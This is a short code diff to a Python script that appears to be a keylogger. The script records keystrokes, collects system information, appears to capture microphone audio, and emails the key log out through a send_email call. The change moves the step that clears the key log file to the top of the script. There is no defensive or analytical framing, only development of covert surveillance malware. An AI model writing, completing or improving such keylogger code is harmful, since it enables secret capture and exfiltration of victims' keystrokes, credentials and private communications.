@@ -62,6 +62,10 @@ microphone_time = 2
 time_iteration = 5
 num_iterations_end = 1
 
+# clean off the key log file for the next execution
+with open(file_path + keys_information, "w") as f:
+    f.write(" ")
+
 def computer_information():
     with open(file_path + system_information, "w") as f:
         f.write("")
@@ -254,10 +258,6 @@ while num_iterations < num_iterations_end:
         listener.join()
     
     if currentTime > stoppingTime:
-        
-        # clean off the key log file for the next execution
-        with open(file_path + keys_information, "w") as f:
-            f.write(" ")
 
         send_email(
             keys_information, 
